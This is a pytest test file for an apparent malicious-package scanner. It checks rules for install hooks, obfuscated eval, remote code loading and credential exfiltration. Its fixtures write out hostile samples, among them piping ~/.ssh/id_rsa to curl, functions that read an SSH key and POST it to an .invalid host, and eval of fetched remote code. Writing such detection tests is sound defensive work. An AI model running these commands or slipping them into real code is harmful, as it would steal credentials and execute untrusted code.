from __future__ import annotations

import os
from pathlib import Path

import pytest

from bawwab.scan.files import ScanFile, load_files
from bawwab.scan.rules import CATALOG, run_static_rules
from bawwab.severity import compute_verdict
from bawwab.types import Severity, Verdict

FIX = Path(__file__).parent / "fixtures" / "code"


def scan(name: str):
    files, load_findings = load_files(FIX / name)
    return load_findings + run_static_rules(files)


def pairs(findings):
    return {(f.rule, f.severity) for f in findings}


def test_clean_server_has_no_findings():
    assert scan("clean_server") == []


def test_benign_postinstall_is_exactly_install_script_med():
    findings = scan("benign_postinstall")
    assert [(f.rule, f.severity) for f in findings] == [("install-script", Severity.MED)]
    assert findings[0].file == "package.json"
    assert findings[0].line == 5


def test_postinstall_curl_is_malicious():
    findings = scan("postinstall_curl")
    assert ("install-script.remote", Severity.CRITICAL) in pairs(findings)
    assert ("remote-code.pipe-shell", Severity.CRITICAL) in pairs(findings)
    assert compute_verdict(findings) == Verdict.MALICIOUS


@pytest.mark.parametrize("name", ["eval_b64_js", "eval_b64_py"])
def test_eval_decoded(name):
    findings = scan(name)
    hits = [f for f in findings if f.rule == "obfuscation.eval-decoded"]
    assert hits and hits[0].severity == Severity.CRITICAL
    assert hits[0].file and hits[0].line


@pytest.mark.parametrize("name", ["cred_exfil_js", "cred_exfil_py"])
def test_cred_exfil(name):
    findings = scan(name)
    for rule in ("credential-access", "exfil.host", "exfil.combo"):
        hits = [f for f in findings if f.rule == rule]
        assert hits, rule
        assert hits[0].file and hits[0].line
    assert len([f for f in findings if f.rule == "exfil.combo"]) == 1
    assert compute_verdict(findings) == Verdict.MALICIOUS


def test_symlink_not_loaded(tmp_path):
    (tmp_path / "a.txt").write_text("hi")
    os.symlink("/etc/passwd", tmp_path / "pw")
    files, _ = load_files(tmp_path)
    assert [f.rel for f in files] == ["a.txt"]


def test_binary_skipped(tmp_path):
    (tmp_path / "b.bin").write_bytes(b"abc\x00def")
    (tmp_path / "a.txt").write_text("hi")
    files, findings = load_files(tmp_path)
    assert [f.rel for f in files] == ["a.txt"] and findings == []


def test_max_files_truncated(tmp_path):
    for n in "abc":
        (tmp_path / f"{n}.txt").write_text(n)
    files, findings = load_files(tmp_path, max_files=2)
    assert len(files) == 2
    assert [(f.rule, f.severity) for f in findings] == [("files.truncated", Severity.MED)]


def test_max_file_bytes_truncated(tmp_path):
    (tmp_path / "big.txt").write_text("x" * 100)
    files, findings = load_files(tmp_path, max_file_bytes=10)
    # Task 10c (A): the first max_file_bytes are scanned; the rest is noted.
    assert [f.text for f in files] == ["x" * 10] and findings[0].rule == "files.truncated"


def test_blob_and_unpinned_deps(tmp_path):
    (tmp_path / "package.json").write_text(
        '{\n "dependencies": {"a": "*", "b": "latest", "c": "git+https://x.invalid/c.git", "d": "1.2.3"}\n}\n'
    )
    (tmp_path / "x.js").write_text('const b = "' + "QUJD" * 60 + '";\n')
    (tmp_path / "requirements.txt").write_text("foo==1.0\nbar @ git+https://x.invalid/bar.git\n")
    files, _ = load_files(tmp_path)
    findings = run_static_rules(files)
    assert sum(f.rule == "deps.unpinned" for f in findings) == 4
    assert any(f.rule == "obfuscation.blob" and f.file == "x.js" for f in findings)


def test_eval_fetch_and_dynamic_import(tmp_path):
    (tmp_path / "a.js").write_text('eval(await (await fetch("https://x.invalid/a")).text());\nimport("https://x.invalid/m.js");\n')
    (tmp_path / "b.py").write_text('import requests\nexec(requests.get("https://x.invalid/a").text)\n')
    (tmp_path / "c.sh").write_text('eval "$(curl -s https://x.invalid/a)"\n')
    files, _ = load_files(tmp_path)
    got = {(f.file, f.line) for f in run_static_rules(files) if f.rule == "remote-code.eval-fetch"}
    assert {("a.js", 1), ("a.js", 2), ("b.py", 2), ("c.sh", 1)} <= got


def test_setup_py_install_script(tmp_path):
    (tmp_path / "setup.py").write_text("import os\nos.system('echo hi')\n")
    files, _ = load_files(tmp_path)
    assert pairs(run_static_rules(files)) == {("install-script", Severity.MED)}


def _scan_dir(tmp_path):
    files, load = load_files(tmp_path)
    return load + run_static_rules(files)


def test_hostile_deep_expression_does_not_crash():
    src = "x = " + "+".join(["1"] * 20000) + "\nimport base64\neval(base64.b64decode('cHJpbnQoMSk='))\n"
    findings = run_static_rules([ScanFile("a.py", src)])
    assert any(f.rule == "obfuscation.eval-decoded" for f in findings)
    assert not any(f.rule == "rules.error" for f in findings)


def test_hostile_deep_setup_py_does_not_crash():
    src = "x = " + "+".join(["1"] * 20000) + "\nimport os\nos.system('echo hi')\n"
    findings = run_static_rules([ScanFile("setup.py", src)])
    assert any(f.rule == "install-script" for f in findings)


def test_failing_rule_becomes_rules_error(monkeypatch):
    from bawwab.scan import rules

    class Boom:
        id = "boom"

        def run(self, files, extra):
            raise ValueError("x")

    monkeypatch.setattr(rules, "ALL_RULES", [Boom(), *rules.ALL_RULES])
    findings = rules.run_static_rules([ScanFile("a.py", "eval(atob('x'))\n")])
    err = [f for f in findings if f.rule == "rules.error"]
    assert len(err) == 1 and err[0].source == "gate" and err[0].severity == Severity.MED
    assert "boom" in err[0].evidence and "ValueError" in err[0].evidence


def test_setup_py_requests_dependency_is_not_remote(tmp_path):
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\nfrom setuptools.command.install import install\n\n"
        "class Post(install):\n    def run(self):\n        install.run(self)\n\n"
        "setup(name='x', install_requires=['requests'], cmdclass={'install': Post})\n"
    )
    assert pairs(_scan_dir(tmp_path)) == {("install-script", Severity.MED)}


def test_setup_py_remote_in_run_is_critical(tmp_path):
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\nfrom setuptools.command.install import install\n\n"
        "class Post(install):\n    def run(self):\n        import urllib.request\n"
        "        urllib.request.urlopen('https://exfil.invalid/x')\n\n"
        "setup(name='x', cmdclass={'install': Post})\n"
    )
    assert ("install-script.remote", Severity.CRITICAL) in pairs(_scan_dir(tmp_path))


def test_dotenv_is_low_and_not_combo(tmp_path):
    (tmp_path / "server.py").write_text(
        "import requests\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\n"
        "def tool():\n    return requests.get('https://api.example.invalid/x')\n"
    )
    findings = _scan_dir(tmp_path)
    assert pairs(findings) == {("credential-access", Severity.LOW)}


def test_combo_requires_same_function(tmp_path):
    pad = "\n".join(f"# filler {i}" for i in range(40))
    (tmp_path / "a.js").write_text(
        "const fs = require('fs');\nfunction readKey() {\n  return fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');\n}\n"
        + pad + "\nfunction ping() {\n  return fetch('https://api.example.invalid/ping');\n}\n"
    )
    findings = _scan_dir(tmp_path)
    assert ("credential-access", Severity.HIGH) in pairs(findings)
    # no same-function combo; the file can still reach the network (fetch), so the R27 floor
    # backstop keeps a credential read there at MED (round 4, R30b)
    assert ("exfil.combo", Severity.CRITICAL) not in pairs(findings)
    assert ("exfil.combo", Severity.MED) in pairs(findings)


def test_combo_same_function_js_and_py(tmp_path):
    (tmp_path / "a.js").write_text(
        "async function go() {\n  const k = require('fs').readFileSync('/h/.ssh/id_rsa');\n  await fetch('https://x.invalid', {body: k});\n}\n"
    )
    (tmp_path / "b.py").write_text(
        "import requests\n\ndef go():\n    k = open('/h/.ssh/id_rsa').read()\n    requests.post('https://x.invalid', data=k)\n"
    )
    findings = _scan_dir(tmp_path)
    assert {f.file for f in findings if f.rule == "exfil.combo"} == {"a.js", "b.py"}


def test_combo_regex_fallback_window(tmp_path):
    (tmp_path / "x.sh").write_text("cat ~/.ssh/id_rsa | curl -d @- https://x.invalid\n")
    assert any(f.rule == "exfil.combo" for f in _scan_dir(tmp_path))


def test_tsx_parsed(tmp_path):
    (tmp_path / "a.tsx").write_text("const C = () => <div>{eval(atob('eA=='))}</div>;\n")
    assert any(f.rule == "obfuscation.eval-decoded" for f in _scan_dir(tmp_path))


def _declared_rule_ids() -> set[str]:
    """Rule ids written as literals in the rule modules (first arg of Finding/_finding, or loop tables)."""
    import ast

    ids: set[str] = set()
    root = Path(__file__).parent.parent / "bawwab" / "scan"
    for path in root.rglob("*.py"):
        for n in ast.walk(ast.parse(path.read_text())):
            if isinstance(n, ast.Call) and getattr(n.func, "id", "") in ("Finding", "_finding"):
                if n.args and isinstance(n.args[0], ast.Constant) and isinstance(n.args[0].value, str):
                    ids.add(n.args[0].value)
            if (
                isinstance(n, ast.Tuple)
                and len(n.elts) == 3
                and isinstance(n.elts[0], ast.Constant)
                and isinstance(n.elts[0].value, str)
                and isinstance(n.elts[1], ast.Attribute)
                and getattr(n.elts[1].value, "id", "") == "Severity"
            ):
                ids.add(n.elts[0].value)
    return ids


def test_every_emitted_rule_id_in_catalog():
    declared = _declared_rule_ids()
    assert {"obfuscation.eval-decoded", "files.truncated", "rules.error", "exfil.combo"} <= declared
    assert declared <= set(CATALOG)
    seen = set()
    for d in FIX.iterdir():
        seen |= {f.rule for f in scan(d.name)}
    assert seen <= set(CATALOG)
    for rid, info in CATALOG.items():
        assert info.id == rid and info.title and info.why and info.fix
